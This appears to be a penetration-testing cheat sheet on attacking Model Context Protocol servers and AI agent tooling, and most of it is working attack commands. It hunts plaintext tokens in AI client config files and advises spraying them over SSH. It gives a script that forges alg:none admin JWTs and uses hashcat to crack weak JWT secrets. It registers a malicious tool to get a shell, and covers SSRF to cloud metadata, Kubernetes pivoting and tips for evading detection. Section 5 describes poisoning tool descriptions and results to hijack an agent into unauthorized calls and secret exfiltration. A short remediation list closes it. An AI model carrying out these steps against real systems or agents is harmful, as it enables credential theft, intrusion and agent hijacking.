# Attacking MCP Servers & AI Tooling

Model Context Protocol (MCP) connects LLM agents to external **tools**, **resources**, and **prompts**. It is a high-value target for three reasons: tools execute code/commands *by design*, the spec made auth optional so many servers ship wide open, and MCP client config files are dense with plaintext credentials. Transports: `stdio` (local subprocess), SSE (`GET /sse` + `POST /message`), and streamable HTTP (`POST /mcp`). Wire format is JSON-RPC 2.0.

Not a CPTS syllabus item — included because MCP servers now appear on real engagements and CTF boxes, and the auth/tool-abuse patterns generalize to any "plugin registry that runs code."

## 1. Discovery & Recon

### 1.1 Config files (credentials + server URLs)
```bash
# Client configs routinely embed bearer tokens / API keys in plaintext
find / -name '*.json' 2>/dev/null | grep -iE 'mcp|claude|cursor|codeium|windsurf|continue'
cat ~/.mcp/config.json 2>/dev/null
cat ~/.cursor/mcp.json ~/.vscode/mcp.json .mcp.json ./mcp.json 2>/dev/null
cat ~/.config/Claude/claude_desktop_config.json 2>/dev/null
grep -rniE 'token|secret|api[_-]?key|password|bearer|authorization' ~/.mcp ~/.cursor 2>/dev/null
```
Config-file creds are frequently reused for the host user — spray them over SSH/services before anything else.

### 1.2 Process / port discovery
```bash
ps aux | grep -iE 'mcp|modelcontext|npx .*server|uvx' | grep -v grep
ss -lntp 2>/dev/null                        # look for local HTTP/SSE listeners (3000/8000/8080/custom)
```

### 1.3 Server metadata — always request first
Most MCP/tool-registry servers expose a version/status/health endpoint that leaks the **auth type, accepted JWT algorithms, and full endpoint list**. This is the map for the whole attack.
```bash
curl -sk http://<TARGET>:<PORT>/api/v1/version | python3 -m json.tool
# note: auth.type, auth.supported_algorithms (e.g. ["HS256","none"]), endpoints[]
curl -sk http://<TARGET>:<PORT>/docs        # FastAPI/OpenAPI schema is common
```

## 2. Protocol Primer (JSON-RPC 2.0)

Core methods: `initialize`, `tools/list`, `tools/call`, `resources/list`, `resources/read`, `prompts/list`, `prompts/get`.
```bash
# List available tools
curl -sk -X POST http://<TARGET>:<PORT>/mcp -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'

# Call a tool
curl -sk -X POST http://<TARGET>:<PORT>/mcp -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"<TOOL>","arguments":{}}}'
```

## 3. Authentication Attacks

### 3.1 No auth (the default)
The MCP spec made authorization optional; a large share of servers require none. Enumerate and call tools directly before assuming you need creds.

### 3.2 JWT abuse
If the metadata endpoint lists `none` or a symmetric alg, treat it as a JWT target — full technique set in [web-methodology.md](web-methodology.md) §2.4. The MCP-specific quick win is `alg:none`:
```bash
# Forge an admin token with alg:"none" (empty signature)
python3 -c '
import base64,json
b=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()
print(b({"alg":"none","typ":"JWT"})+"."+b({"sub":"attacker","role":"admin"})+".")'
```
```bash
# HS256 weak secret → crack, then re-sign with role:admin
jwt_tool <JWT> -C -d /usr/share/wordlists/rockyou.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```
Decode the server's own token first (`cut -d. -f2 | base64 -d`) to learn the claim names (`role`, `scope`, `sub`) to forge.

## 4. Tool Registry Abuse → RCE

MCP tools run code. If you can **register or modify** a tool (usually an admin-gated endpoint), you have RCE by design.

### 4.1 Enumerate tools for dangerous capability
`tools/list` — flag any tool that shells out, reads/writes files, evaluates code, or fetches URLs (SSRF).

### 4.2 Malicious tool registration (generic chain)
```
auth/obtain-or-forge admin token
  -> POST /tools (or admin registration RPC) with a tool whose body is your payload
  -> tools/call to invoke it -> shell
```
```bash
ADMIN_JWT='<forged-none-alg-token>'
curl -sk -X POST http://<TARGET>:<PORT>/api/v1/tools \
  -H "Authorization: Bearer $ADMIN_JWT" -H 'Content-Type: application/json' \
  -d '{"name":"shell","description":"x","inputSchema":{"type":"object","properties":{}},
       "code":"<PAYLOAD>"}'
curl -sk -X POST http://<TARGET>:<PORT>/mcp -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

### 4.3 Two execution gotchas that waste hours
- **Module-level code gets stripped.** Some servers AST-parse the tool code and keep only the class/function, discarding top-level statements. Put the payload **inside the invoked handler/method**, and move imports in with it.
- **Registration/build is often async.** A fast `200` returning a `job_id` means the code is only *queued*. It does not execute until you consume the run/events endpoint (e.g. `GET .../build/<job_id>/events`, an SSE stream). General rule: **a `200` + `job_id` = asynchronous; find the endpoint that drives the job.**

### 4.4 Injection & SSRF via existing tools
Tools that shell out with unsanitized `arguments`, or fetch attacker-supplied URLs, are command-injection / SSRF primitives — reach cloud metadata (`169.254.169.254`) or internal services via `tools/call`. `resources/read` with `file://` paths is a common arbitrary-file-read.

## 5. Prompt Injection (indirect)

Tool **descriptions**, tool **results**, and **resources** are fed verbatim into the consuming LLM's context. If the target is an AI agent that trusts your MCP server (or data you control that it ingests), poison those fields to hijack the agent: coerce unauthorized tool calls, exfiltrate context/secrets, or pull off a *confused-deputy* (agent has privileges the attacker does not). Highest impact when the agent auto-approves tool calls.

## 6. Post-Exploitation

- Loot every MCP config for tokens/keys → pivot to the backing services they authenticate to (DBs, cloud, other MCP servers).
- MCP servers commonly run over-privileged (confused deputy) — enumerate what the process token can actually reach.
- Containerized servers: check `/var/run/secrets/kubernetes.io/serviceaccount/` and pivot into the cluster — see the Kubernetes section in [attacking-common-applications.md](attacking-common-applications.md).

## Detection / OPSEC
- Tool **registration** and a reverse shell spawned from an AI-tool process are both high-signal, anomalous events — mature servers log `tools/call` with tool name and caller.
- `alg:none` tokens are trivially flagged wherever the JWT header is logged.
- Prefer abusing an *existing* benign tool's injection over registering a new one when stealth matters.

## Remediation pointers
- Require auth (OAuth 2.1 / mTLS); pin algorithms server-side and **reject `none`**.
- Least-privilege, sandboxed tool execution; forbid dynamic tool registration from untrusted principals.
- Never store plaintext tokens in MCP config files; scope tokens narrowly.
